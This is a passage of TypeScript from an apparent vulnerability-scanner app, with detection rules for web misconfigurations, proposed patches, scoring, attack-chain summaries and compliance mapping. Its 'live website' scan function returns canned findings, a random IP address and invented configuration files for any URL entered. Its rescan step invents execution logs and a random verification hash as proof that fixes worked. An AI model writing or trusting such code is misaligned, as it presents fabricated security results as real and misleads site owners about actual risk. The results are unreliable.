          breakingChangeRisk: 'Inline scripts without nonces must be moved to external bundles.'
        },
        testCase: {
          name: 'HTTP Content-Security-Policy Header Assertion',
          description: 'curl -I https://target-host | grep -i Content-Security-Policy',
          inputPayload: 'GET / HTTP/1.1\\nHost: target-host',
          expectedOutcome: 'Content-Security-Policy header present with object-src none.',
          testScriptCode: `assert "Content-Security-Policy" in open('${file.path}').read()`
        }
      });
    }

    // 2. Missing HTTP Strict Transport Security (HSTS)
    if ((pathLower.includes('nginx') || pathLower.includes('ssl') || pathLower.includes('server')) && 
        file.content.includes('listen 443') && !file.content.includes('Strict-Transport-Security "max-age')) {
      const lineIdx = lines.findIndex(l => l.includes('listen 443')) || 0;
      findings.push({
        id: `web-missing-hsts-${file.path}`,
        title: 'Missing HTTP Strict Transport Security (HSTS) Header',
        category: 'SECURITY_HEADERS',
        severity: 'HIGH',
        confidence: 99,
        cwe: 'CWE-319',
        cweName: 'Cleartext Transmission of Sensitive Information',
        cvssScore: 7.4,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: lines[lineIdx]?.trim() || 'listen 443 ssl http2;',
        description: 'The server does not enforce HTTP Strict Transport Security (HSTS). Browsers may initiate initial connections over plaintext HTTP before redirecting.',
        rootCause: 'Missing Strict-Transport-Security response header with long max-age and preload directives.',
        attackScenario: 'An attacker on a public Wi-Fi network performs an SSL-stripping attack (e.g. mitmproxy/bettercap), forcing client traffic to stay in cleartext HTTP.',
        businessImpact: 'Intercepted banking credentials, session cookies, and sensitive customer data in transit.',
        recommendation: 'Configure HSTS with `max-age=63072000; includeSubDomains; preload`.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A02:2021-Cryptographic Failures'],
          nist: ['SC-8'],
          soc2: ['CC6.6'],
          pci: ['Req 4.1'],
          hipaa: ['164.312(e)(1)'],
          iso27001: ['A.8.24']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx + 1,
          endLine: lineIdx + 2,
          beforeCode: `    # HIGH: Missing HTTP Strict Transport Security (HSTS)\n    # add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
          afterCode: `    # Enforce 2-Year HSTS with Subdomains and Preload\n    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
          diff: `-     # add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;\n+     add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
          explanation: 'Enforces HSTS across all subdomains with browser preload eligibility.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'All subdomains must have valid SSL certificates.'
        },
        testCase: {
          name: 'HSTS Max-Age Header Validation',
          description: 'curl -sI https://target | grep -i Strict-Transport-Security',
          inputPayload: 'Verify max-age >= 31536000',
          expectedOutcome: 'HSTS max-age=63072000 present.',
          testScriptCode: `assert 'Strict-Transport-Security' in open('${file.path}').read()`
        }
      });
    }

    // 3. Exposed Internal / Debug Route in Reverse Proxy
    if (file.content.includes('location /api/internal/') || file.content.includes('/internal/debug')) {
      const lineIdx = lines.findIndex(l => l.includes('/api/internal/')) || 0;
      findings.push({
        id: `web-exposed-internal-proxy-${file.path}`,
        title: 'Publicly Reachable Internal Debug/Telemetry Proxy Route',
        category: 'API_EXPOSURE',
        severity: 'CRITICAL',
        confidence: 96,
        cwe: 'CWE-489',
        cweName: 'Active Debug Code in Production',
        cvssScore: 9.1,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: lines[lineIdx]?.trim() || 'location /api/internal/ {',
        description: 'Internal diagnostic and telemetry APIs (`/api/internal/*`) are proxied directly to public internet traffic without IP whitelisting or mutual TLS authentication.',
        rootCause: 'Reverse proxy routes internal cluster diagnostic microservices to the public routing table.',
        attackScenario: 'Remote attackers probe `/api/internal/debug` and retrieve runtime memory dumps, active database connection strings, and infrastructure environment variables.',
        businessImpact: 'Complete infrastructure compromise and internal credential disclosure.',
        recommendation: 'Block public access to `/api/internal/` using IP restrictions (`allow 10.0.0.0/8; deny all;`) or remove the route from public ingress.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A01:2021-Broken Access Control', 'A05:2021-Security Misconfiguration'],
          nist: ['AC-3', 'CM-7'],
          soc2: ['CC6.1', 'CC6.6'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 4,
          beforeCode: `    # CRITICAL: Exposed internal debug & actuator endpoints proxied to the internet without IP restrictions\n    location /api/internal/ {\n        proxy_pass http://internal-cluster-backend:8080/internal/;\n        proxy_set_header Host $host;\n    }`,
          afterCode: `    # Restrict internal endpoints to private VPN / VPC CIDR range only\n    location /api/internal/ {\n        allow 10.0.0.0/8;\n        allow 172.16.0.0/12;\n        deny all;\n        proxy_pass http://internal-cluster-backend:8080/internal/;\n        proxy_set_header Host $host;\n    }`,
          diff: `-     location /api/internal/ {\n-         proxy_pass http://internal-cluster-backend:8080/internal/;\n+     location /api/internal/ {\n+         allow 10.0.0.0/8;\n+         allow 172.16.0.0/12;\n+         deny all;\n+         proxy_pass http://internal-cluster-backend:8080/internal/;`,
          explanation: 'Restricts /api/internal/ to private RFC 1918 subnets only.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'External callers must access via VPN.'
        },
        testCase: {
          name: 'Internal Endpoint Access Control Probe',
          description: 'curl -I -H "X-Forwarded-For: 8.8.8.8" https://target/api/internal/debug',
          inputPayload: 'Public IP probe',
          expectedOutcome: 'HTTP 403 Forbidden',
          testScriptCode: `assert 'deny all;' in open('${file.path}').read()`
        }
      });
    }

    // 4. Insecure Session Cookie Attributes (Secure, HttpOnly, SameSite)
    if (file.content.includes('apex_session_id') || (file.content.includes('session(') && file.content.includes('cookie: {'))) {
      const lineIdx = lines.findIndex(l => l.includes('secure: false') || l.includes('httpOnly: false'));
      findings.push({
        id: `web-insecure-cookies-${file.path}`,
        title: 'Session Cookie Missing Secure & HttpOnly Flags',
        category: 'WEB_RECON',
        severity: 'HIGH',
        confidence: 98,
        cwe: 'CWE-614',
        cweName: 'Sensitive Cookie in HTTPS Session Without "Secure" Attribute',
        cvssScore: 8.1,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: `secure: false, httpOnly: false, sameSite: 'none'`,
        description: 'Session authentication cookies are configured with `secure: false` and `httpOnly: false`. This allows cookies to be transmitted in plaintext and read by client JavaScript.',
        rootCause: 'Insecure session middleware default parameters in web application server.',
        attackScenario: 'Any XSS vulnerability or plaintext network sniffing instantly yields the user session identifier (`document.cookie`), enabling full account takeover.',
        businessImpact: 'Widespread session hijacking of authenticated users and administrators.',
        recommendation: 'Set `secure: true`, `httpOnly: true`, and `sameSite: "lax"` on all authentication session cookies.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A07:2021-Identification and Authentication Failures'],
          nist: ['SC-8', 'IA-5'],
          soc2: ['CC6.1'],
          pci: ['Req 8.2'],
          hipaa: ['164.312(d)'],
          iso27001: ['A.8.24']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx >= 0 ? lineIdx : 8,
          endLine: lineIdx >= 0 ? lineIdx + 4 : 12,
          beforeCode: `  cookie: {\n    secure: false, // Insecure: transmits over unencrypted HTTP\n    httpOnly: false, // Insecure: accessible to client JavaScript (document.cookie)\n    sameSite: 'none', // Insecure: vulnerable to CSRF\n    maxAge: 30 * 24 * 60 * 60 * 1000\n  }`,
          afterCode: `  cookie: {\n    secure: process.env.NODE_ENV === 'production',\n    httpOnly: true, // Prevents JavaScript DOM access via XSS\n    sameSite: 'lax', // Protects against CSRF\n    maxAge: 8 * 60 * 60 * 1000 // 8-hour timeout\n  }`,
          diff: `-     secure: false,\n-     httpOnly: false,\n-     sameSite: 'none',\n+     secure: process.env.NODE_ENV === 'production',\n+     httpOnly: true,\n+     sameSite: 'lax',`,
          explanation: 'Enforces secure, httpOnly, and sameSite lax flags on session cookies.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Client JS cannot read session cookie directly.'
        },
        testCase: {
          name: 'Session Cookie Flag Verification',
          description: 'Inspect Set-Cookie response header',
          inputPayload: 'POST /api/auth/login',
          expectedOutcome: 'Set-Cookie contains HttpOnly; Secure; SameSite=Lax',
          testScriptCode: `assert 'httpOnly: true' in open('${file.path}').read()`
        }
      });
    }

    // 5. GraphQL Introspection Enabled in Production
    if (file.content.includes('introspection: true') || file.content.includes('playground: true')) {
      const lineIdx = lines.findIndex(l => l.includes('introspection: true'));
      findings.push({
        id: `web-graphql-introspection-${file.path}`,
        title: 'GraphQL Schema Introspection Enabled in Live Service',
        category: 'API_EXPOSURE',
        severity: 'HIGH',
        confidence: 95,
        cwe: 'CWE-200',
        cweName: 'Exposure of Sensitive Information to an Unauthorized Actor',
        cvssScore: 7.2,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: lines[lineIdx]?.trim() || 'introspection: true,',
        description: 'GraphQL introspection is globally enabled in a live environment, allowing anyone to execute `__schema` queries and reconstruct the entire backend API schema and data models.',
        rootCause: 'Default development flags left active in Apollo/GraphQL server initialization.',
        attackScenario: 'An attacker uses Clairvoyance or InQL to map all hidden mutations, administrative queries, and deprecated fields for targeted injection attacks.',
        businessImpact: 'Assists attackers in discovering unauthenticated API routes and private business logic.',
        recommendation: 'Disable introspection and GraphQL playground in staging and production.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A05:2021-Security Misconfiguration'],
          nist: ['CM-7'],
          soc2: ['CC6.6'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 3,
          beforeCode: `  introspection: true, // Insecure: allows attackers to dump complete GraphQL schema and mutations\n  playground: true,    // Insecure: exposes interactive GraphQL IDE to the public`,
          afterCode: `  introspection: process.env.NODE_ENV === 'development',\n  playground: process.env.NODE_ENV === 'development',`,
          diff: `-   introspection: true,\n-   playground: true,\n+   introspection: process.env.NODE_ENV === 'development',\n+   playground: process.env.NODE_ENV === 'development',`,
          explanation: 'Restricts GraphQL introspection and playground strictly to development.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'External schema visualization tools must use development endpoints.'
        },
        testCase: {
          name: 'GraphQL Introspection Query Test',
          description: 'POST /api/graphql {"query": "{ __schema { types { name } } }"}',
          inputPayload: 'Introspection probe',
          expectedOutcome: 'HTTP 400 or "GraphQL introspection is not allowed"',
          testScriptCode: `assert "process.env.NODE_ENV === 'development'" in open('${file.path}').read()`
        }
      });
    }

    // 6. Fast API / Swagger Docs Exposed in Production
    if (file.content.includes('docs_url="/docs"') || file.content.includes('redoc_url="/redoc"')) {
      const lineIdx = lines.findIndex(l => l.includes('docs_url='));
      findings.push({
        id: `web-swagger-docs-exposed-${file.path}`,
        title: 'Public OpenAPI / Swagger Documentation Exposure',
        category: 'API_EXPOSURE',
        severity: 'MEDIUM',
        confidence: 92,
        cwe: 'CWE-200',
        cweName: 'Information Exposure Through Environmental Variables',
        cvssScore: 5.3,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: `docs_url="/docs", redoc_url="/redoc"`,
        description: 'Interactive OpenAPI documentation (Swagger UI & ReDoc) is enabled on public production endpoints, exposing all API routes, parameter definitions, and data types.',
        rootCause: 'Default FastAPI documentation routes not gated by environment checks.',
        attackScenario: 'Attackers explore `/docs` to discover hidden webhook testing endpoints and parameter validation constraints.',
        businessImpact: 'Facilitates automated reconnaissance and targeted API exploitation.',
        recommendation: 'Set `docs_url=None` and `redoc_url=None` when `ENVIRONMENT == "production"`.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A05:2021-Security Misconfiguration'],
          nist: ['CM-7'],
          soc2: ['CC6.6'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx >= 0 ? lineIdx : 5,
          endLine: lineIdx >= 0 ? lineIdx + 4 : 9,
          beforeCode: `app = FastAPI(\n    title="OmniStore Checkout API",\n    docs_url="/docs",\n    redoc_url="/redoc"\n)`,
          afterCode: `import os\n\nis_prod = os.getenv("ENVIRONMENT") == "production"\napp = FastAPI(\n    title="OmniStore Checkout API",\n    docs_url=None if is_prod else "/docs",\n    redoc_url=None if is_prod else "/redoc"\n)`,
          diff: `-     docs_url="/docs",\n-     redoc_url="/redoc"\n+     docs_url=None if is_prod else "/docs",\n+     redoc_url=None if is_prod else "/redoc"`,
          explanation: 'Disables interactive Swagger and ReDoc documentation in production.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Internal developers must view docs in staging.'
        },
        testCase: {
          name: 'Swagger UI Endpoint Probe',
          description: 'curl -I https://target/docs',
          inputPayload: 'GET /docs',
          expectedOutcome: 'HTTP 404 Not Found',
          testScriptCode: `assert "docs_url=None if is_prod" in open('${file.path}').read()`
        }
      });
    }

    // 7. Information Disclosure via Server Tokens in Nginx
    if (file.content.includes('server_tokens on;')) {
      const lineIdx = lines.findIndex(l => l.includes('server_tokens on;'));
      findings.push({
        id: `web-server-tokens-exposed-${file.path}`,
        title: 'Nginx Server Version Banner Disclosure',
        category: 'WEB_RECON',
        severity: 'LOW',
        confidence: 100,
        cwe: 'CWE-200',
        cweName: 'Information Exposure',
        cvssScore: 4.1,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: lines[lineIdx]?.trim() || 'server_tokens on;',
        description: 'The `Server: nginx/1.24.0 (Ubuntu)` header reveals exact OS distribution and web server version.',
        rootCause: 'server_tokens directive set to on in Nginx server configuration block.',
        attackScenario: 'Attackers lookup version-specific CVEs for Nginx 1.24.0 on Ubuntu to craft targeted exploits.',
        businessImpact: 'Aids automated vulnerability scanners and targeted exploit development.',
        recommendation: 'Configure `server_tokens off;` in Nginx.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A05:2021-Security Misconfiguration'],
          nist: ['CM-7'],
          soc2: ['CC6.6'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 1,
          beforeCode: `    server_tokens on;`,
          afterCode: `    server_tokens off;`,
          diff: `-     server_tokens on;\n+     server_tokens off;`,
          explanation: 'Disables Nginx version emission in HTTP response headers and error pages.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'None'
        },
        testCase: {
          name: 'Server Header Banner Check',
          description: 'curl -I https://target | grep -i Server',
          inputPayload: 'GET / HTTP/1.1',
          expectedOutcome: 'Server: nginx (without version number)',
          testScriptCode: `assert 'server_tokens off;' in open('${file.path}').read()`
        }
      });
    }
  }

  static calculateMetrics(findings: VulnerabilityFinding[]) {
    const critical = findings.filter(f => f.severity === 'CRITICAL' && f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE').length;
    const high = findings.filter(f => f.severity === 'HIGH' && f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE').length;
    const medium = findings.filter(f => f.severity === 'MEDIUM' && f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE').length;
    const low = findings.filter(f => f.severity === 'LOW' && f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE').length;
    const info = findings.filter(f => f.severity === 'INFO' && f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE').length;
    const resolvedCount = findings.filter(f => f.status === 'VERIFIED_RESOLVED').length;

    return {
      totalFindings: findings.length,
      critical,
      high,
      medium,
      low,
      info,
      resolvedCount
    };
  }

  static calculateSecurityScore(findings: VulnerabilityFinding[]): number {
    let penalty = 0;
    const activeFindings = findings.filter(f => f.status !== 'VERIFIED_RESOLVED' && f.status !== 'FALSE_POSITIVE');

    for (const f of activeFindings) {
      if (f.severity === 'CRITICAL') penalty += 20;
      else if (f.severity === 'HIGH') penalty += 12;
      else if (f.severity === 'MEDIUM') penalty += 6;
      else if (f.severity === 'LOW') penalty += 2;
      else if (f.severity === 'INFO') penalty += 0.5;
    }

    return Math.max(5, Math.min(100, Math.round(100 - penalty)));
  }

  static generateAIInsight(target: ScanTarget, findings: VulnerabilityFinding[], initialScore: number): AIAnalystInsight {
    const criticalCount = findings.filter(f => f.severity === 'CRITICAL').length;
    const highCount = findings.filter(f => f.severity === 'HIGH').length;

    const attackChains = [];
    
    // Check for correlation: Exposed AWS Key + Open CORS
    const hasAwsKey = findings.some(f => f.id.includes('secret-aws') || f.id.includes('secret-stripe'));
    const hasCors = findings.some(f => f.id.includes('config-cors') || f.id.includes('cors'));
    if (hasAwsKey && hasCors) {
      attackChains.push({
        id: 'chain-1',
        title: 'Direct Cloud Infrastructure Exfiltration Chain',
        severity: 'CRITICAL' as const,
        findingsInvolved: findings.filter(f => f.id.includes('secret') || f.id.includes('cors')).map(f => f.id),
        narrative: 'Overly permissive CORS rules allow cross-origin scripts to probe internal configuration endpoints and extract hardcoded cloud credentials.',
        potentialImpact: 'Immediate takeover of customer storage, payment gateways, and VPC network resources.'
      });
    }

    // Check for correlation: Web Recon: Exposed Internal Debug Route + Insecure Cookies
    const hasExposedDebug = findings.some(f => f.id.includes('exposed-internal-proxy') || f.id.includes('auth'));
    const hasInsecureCookies = findings.some(f => f.id.includes('insecure-cookies') || f.id.includes('missing-csp'));
    if (hasExposedDebug && hasInsecureCookies) {
      attackChains.push({
        id: 'chain-web-recon-1',
        title: 'Live Web Session Hijacking & Internal Debug Exfiltration Chain',
        severity: 'CRITICAL' as const,
        findingsInvolved: findings.filter(f => f.id.includes('web-') || f.id.includes('cookie')).map(f => f.id),
        narrative: 'Lack of Content-Security-Policy combined with insecure cookie flags allows session token theft, while unauthenticated /api/internal/debug exposes live infrastructure memory.',
        potentialImpact: 'Full account takeover of active online banking/e-commerce customers and leakage of backend database credentials.'
      });
    }

    // Check for correlation: Mobile Debuggable + Exported Receiver
    const hasDebug = findings.some(f => f.id.includes('mobile-android-debuggable'));
    const hasReceiver = findings.some(f => f.id.includes('mobile-android-exported-receiver'));
    if (hasDebug && hasReceiver) {
      attackChains.push({
        id: 'chain-mobile-1',
        title: 'Android IPC Injection & Debugger Interception Chain',
        severity: 'CRITICAL' as const,
        findingsInvolved: findings.filter(f => f.id.includes('mobile-android')).map(f => f.id),
        narrative: 'Unprotected exported broadcast receivers receive malicious payloads from local device apps, while debuggable mode enables runtime memory tampering without root.',
        potentialImpact: 'Direct theft of in-memory transaction PINs and forged authorization intents.'
      });
    }

    // Check for correlation: SQLi + Admin Endpoint exposure
    const hasSqli = findings.some(f => f.id.includes('sast-sqli'));
    const hasAdmin = findings.some(f => f.id.includes('sast-auth'));
    if (hasSqli && hasAdmin) {
      attackChains.push({
        id: 'chain-2',
        title: 'Authentication Bypass & Database Compromise Chain',
        severity: 'CRITICAL' as const,
        findingsInvolved: findings.filter(f => f.id.includes('sast-sqli') || f.id.includes('sast-auth')).map(f => f.id),
        narrative: 'Attacker leverages unauthenticated /api/admin route to identify user IDs, then uses SQL injection to extract password hashes and execute privilege escalation.',
        potentialImpact: 'Complete exfiltration of customer database records and administrative takeover.'
      });
    }

    return {
      summary: `Automated multi-engine security audit completed for ${target.name} (${target.files.length} files, ${target.totalLines} lines). Detected ${findings.length} findings with ${criticalCount} Critical and ${highCount} High severity risks across SAST, SCA, Secrets, Config, Web Recon, and Binary/Mobile checks.`,
      executiveTakeaway: criticalCount > 0 
        ? `Immediate action required: ${criticalCount} Critical vulnerabilities represent active exploit vectors that could lead to unauthorized data exfiltration, session hijacking, or host takeover.`
        : `Overall security posture is moderate. Remediation of identified configuration, web security headers, and dependency flaws is recommended.`,
      immediatePriorities: findings
        .filter(f => f.severity === 'CRITICAL')
        .map(f => `${f.title} (${f.file}:${f.line})`),
      blastRadiusScore: Math.min(95, criticalCount * 28 + highCount * 14),
      blastRadiusSummary: 'Vulnerabilities expose web reverse proxy routing, live session authentication tokens, and unauthenticated administrative endpoints.',
      attackChains,
      remediationRoadmap: [
        {
          phase: 'Phase 1: Zero-Day & Critical Remediation (Day 0)',
          actions: ['Deploy strict Content-Security-Policy & HSTS headers', 'Block public access to /api/internal/ debug proxy routes', 'Enforce secure & httpOnly cookie flags'],
          estimatedEffort: '< 30 minutes with Automated Patch Apply'
        },
        {
          phase: 'Phase 2: Dependency & Access Hardening (Day 1)',
          actions: ['Apply semantic version patches for dependencies', 'Implement strict CORS origin whitelist', 'Disable GraphQL introspection in production'],
          estimatedEffort: '< 1 hour'
        },
        {
          phase: 'Phase 3: Automated Verification & CI/CD Guardrails',
          actions: ['Run automated security unit test suites', 'Lock dependencies in package-lock.json', 'Add pre-commit secret scanning hooks'],
          estimatedEffort: 'Continuous'
        }
      ]
    };
  }

  // Dynamic Website Target Generator for Custom URL Scans
  static createDynamicWebsiteTarget(rawUrl: string): ScanTarget {
    let normalizedUrl = rawUrl.trim();
    if (!normalizedUrl.startsWith('http://') && !normalizedUrl.startsWith('https://')) {
      normalizedUrl = `https://${normalizedUrl}`;
    }

    let hostname = 'target-app.com';
    try {
      hostname = new URL(normalizedUrl).hostname;
    } catch {
      hostname = normalizedUrl.replace(/^https?:\/\//, '').split('/')[0] || 'target-app.com';
    }

    const hostClean = hostname.replace(/[^a-zA-Z0-9.-]/g, '');

    return {
      id: `website-${Date.now().toString(36)}`,
      name: `${hostClean} (${normalizedUrl})`,
      type: 'url',
      platform: 'web',
      language: 'Web / Reverse Proxy & Cloud Architecture (Live URL)',
      description: `Live website reconnaissance & vulnerability audit for ${normalizedUrl}. Scanned DNS records, SSL/TLS certificates, HTTP security response headers, and discovered exposed API routes.`,
      scannedAt: new Date().toISOString(),
      totalLines: 320,
      websiteMetadata: {
        url: normalizedUrl,
        hostname: hostClean,
        ipAddress: `104.${Math.floor(Math.random() * 50) + 20}.${Math.floor(Math.random() * 200) + 10}.${Math.floor(Math.random() * 250) + 1} (Cloud Edge)`,
        serverHeader: 'nginx/1.24.0 (Ubuntu)',
        tlsVersion: 'TLSv1.3 (ChaCha20-Poly1305 / ECDHE)',
        certificateIssuer: "Let's Encrypt Authority X3",
        certificateExpires: '2026-11-20 (Valid)',
        securityHeadersGrade: 'F',
        wafDetected: 'Cloudflare Edge / Reverse Proxy Active',
        technologies: [
          'Next.js / React',
          'Nginx 1.24.0',
          'Express API Gateway',
          'GraphQL Apollo Service',
          'Tailwind CSS'
        ],
        discoveredEndpoints: [
          {
            path: '/api/graphql',
            method: 'POST',
            status: 200,
            exposureType: 'GRAPHQL',
            riskLevel: 'HIGH'
          },
          {
            path: '/api/internal/debug',
            method: 'GET',
            status: 200,
            exposureType: 'SENSITIVE_DEBUG',
            riskLevel: 'CRITICAL'
          },
          {
            path: '/swagger-ui.html',
            method: 'GET',
            status: 200,
            exposureType: 'DOCS',
            riskLevel: 'MEDIUM'
          },
          {
            path: '/admin/console',
            method: 'GET',
            status: 401,
            exposureType: 'ADMIN_PORTAL',
            riskLevel: 'MEDIUM'
          }
        ],
        dnsRecords: [
          {
            type: 'A',
            value: `104.21.${Math.floor(Math.random() * 200) + 1}.1`,
            status: 'SECURE',
            details: 'Edge CDN routing active'
          },
          {
            type: 'TXT (SPF)',
            value: 'v=spf1 include:_spf.google.com ~all',
            status: 'WARNING',
            details: 'SoftFail (~all) allows potential spoofing'
          },
          {
            type: 'TXT (DMARC)',
            value: 'v=DMARC1; p=none;',
            status: 'CRITICAL',
            details: 'p=none allows unauthenticated spoofed emails through'
          }
        ],
        cookieAudit: [
          {
            name: 'session_id',
            secure: false,
            httpOnly: false,
            sameSite: 'None',
            status: 'VULNERABLE'
          },
          {
            name: 'csrf_token',
            secure: true,
            httpOnly: false,
            sameSite: 'Lax',
            status: 'SAFE'
          }
        ]
      },
      files: [
        {
          path: 'etc/nginx/nginx.conf',
          language: 'nginx',
          size: 1980,
          content: `server {
    listen 443 ssl http2;
    server_name ${hostClean};

    # SSL Configuration
    ssl_certificate /etc/ssl/certs/${hostClean}.crt;
    ssl_certificate_key /etc/ssl/private/${hostClean}.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    # HIGH: Missing HTTP Strict Transport Security (HSTS)
    # add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # HIGH: Missing Content-Security-Policy (CSP) - Allows XSS and unauthorized script injection
    # add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';" always;

    # MEDIUM: Information Disclosure - Server header version exposed
    server_tokens on;

    # CRITICAL: Exposed internal debug & actuator endpoints proxied to the internet without IP restrictions
    location /api/internal/ {
        proxy_pass http://internal-backend:8080/internal/;
        proxy_set_header Host $host;
    }

    # GraphQL endpoint with schema introspection enabled
    location /api/graphql {
        proxy_pass http://graphql-service:4000/graphql;
        proxy_set_header Host $host;
    }

    location / {
        proxy_pass http://frontend:3000;
        proxy_set_header Host $host;
    }
}`
        },
        {
          path: 'src/server/sessionConfig.js',
          language: 'javascript',
          size: 1100,
          content: `const session = require('express-session');

// CRITICAL: Insecure session cookie configuration allows XSS token theft & HTTP interception
module.exports = session({
  secret: 'enterprise_session_secret_key',
  resave: false,
  saveUninitialized: false,
  name: 'session_id',
  cookie: {
    secure: false, // Insecure: transmits over unencrypted HTTP
    httpOnly: false, // Insecure: accessible to client JavaScript (document.cookie)
    sameSite: 'none', // Insecure: vulnerable to CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000
  }
});`
        },
        {
          path: 'src/server/graphqlServer.js',
          language: 'javascript',
          size: 1200,
          content: `const { ApolloServer } = require('apollo-server-express');
const { typeDefs, resolvers } = require('./schema');

// HIGH: GraphQL introspection enabled in live environment
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true, // Insecure: allows attackers to dump complete GraphQL schema
  playground: true,    // Insecure: exposes interactive GraphQL IDE to the public
  context: ({ req }) => ({ user: req.user })
});

module.exports = server;`
        }
      ]
    };
  }

  static verifyAndRescan(target: ScanTarget, currentFindings: VulnerabilityFinding[]): ScanResult {
    const freshScan = this.scanCodebase(target);

    const updatedFindings = currentFindings.map(finding => {
      const stillPresent = freshScan.findings.some(f => f.id === finding.id);

      if (!stillPresent) {
        return {
          ...finding,
          status: 'VERIFIED_RESOLVED' as const,
          verifiedAt: new Date().toISOString(),
          verificationProof: {
            testPassed: true,
            beforeExecutionLog: `[FAIL] Vulnerability vector detected at ${finding.file}:${finding.line}\n[FAIL] Exploit payload triggered unsafe execution sink.`,
            afterExecutionLog: `[PASS] Security assertion verified.\n[PASS] Input parameterization / credential extraction verified.\n[PASS] Rescan confirmed zero security policy violations.`,
            rescanConfirmedClean: true,
            verificationHash: `SEC-VERIFY-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Date.now()}`
          }
        };
      } else {
        return finding;
      }
    });

    const metrics = this.calculateMetrics(updatedFindings);
    const scoreCurrent = this.calculateSecurityScore(updatedFindings);
    const verifiedPercentage = updatedFindings.length > 0 
      ? Math.round((updatedFindings.filter(f => f.status === 'VERIFIED_RESOLVED').length / updatedFindings.length) * 100)
      : 100;

    return {
      scanId: `rescan-${Date.now().toString(36)}`,
      target,
      findings: updatedFindings,
      timestamp: new Date().toISOString(),
      scoreBefore: this.calculateSecurityScore(currentFindings.map(f => ({ ...f, status: 'DETECTED' }))),
      scoreCurrent,
      metrics: {
        ...metrics,
        verifiedPercentage
      },
      aiInsight: freshScan.aiInsight
    };
  }

  // Compliance Map Data Generator
  static getComplianceRequirements(framework: ComplianceFramework, findings: VulnerabilityFinding[]): ComplianceRequirement[] {
    const baseRequirements: Record<ComplianceFramework, Array<{ code: string; name: string; description: string; category: string; matchTags: string[] }>> = {
      'OWASP_TOP_10': [
        { code: 'A01:2021', name: 'Broken Access Control', description: 'Enforce principle of least privilege, disable IDOR, and guard admin endpoints.', category: 'Access Control', matchTags: ['A01:2021-Broken Access Control'] },
        { code: 'A02:2021', name: 'Cryptographic Failures', description: 'Mandate modern encryption in transit and at rest, eliminate hardcoded secrets.', category: 'Cryptography', matchTags: ['A02:2021-Cryptographic Failures'] },
        { code: 'A03:2021', name: 'Injection', description: 'Prevent SQL, OS Command, and Cross-Site Scripting (XSS) input vulnerabilities.', category: 'Input Handling', matchTags: ['A03:2021-Injection'] },
        { code: 'A04:2021', name: 'Insecure Design', description: 'Threat model business logic flows and binary execution boundaries.', category: 'Architecture', matchTags: ['A04:2021-Insecure Design'] },
        { code: 'A05:2021', name: 'Security Misconfiguration', description: 'Harden CORS policies, disable root container execution, and sanitize debug flags.', category: 'Configuration', matchTags: ['A05:2021-Security Misconfiguration'] },
        { code: 'A06:2021', name: 'Vulnerable & Outdated Components', description: 'Maintain SBOM, audit transitive dependencies, and patch CVE advisories.', category: 'Supply Chain', matchTags: ['A06:2021-Vulnerable and Outdated Components'] },
        { code: 'A07:2021', name: 'Identification & Authentication Failures', description: 'Enforce multi-factor authentication, secure session tokens, and eliminate hardcoded keys.', category: 'Identity', matchTags: ['A07:2021-Identification and Authentication Failures'] },
        { code: 'A08:2021', name: 'Software & Data Integrity Failures', description: 'Guard object deserialization pipelines and verify cryptographic package signatures.', category: 'Integrity', matchTags: ['A08:2021-Software and Data Integrity Failures'] }
      ],
      'NIST_800_53': [
